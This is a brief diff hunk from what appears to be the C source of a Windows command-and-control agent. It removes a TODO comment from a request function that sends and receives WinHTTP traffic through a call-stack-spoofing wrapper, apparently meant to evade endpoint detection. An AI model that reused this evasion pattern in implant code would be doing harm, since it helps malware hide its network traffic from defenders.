@@ -73,7 +73,6 @@ BOOL PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response)
 		index++;
 	}
 	TotalLength += BufferLength;
-	//TODO maybe change the total length to stop getting cucked by decryption. we'll see.
 	if (SpoofStack(agent->apis->pWinHttpSendRequest,7, hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
 	{
 		if (SpoofStack(agent->apis->pWinHttpReceiveResponse, 2, hRequest, NULL))
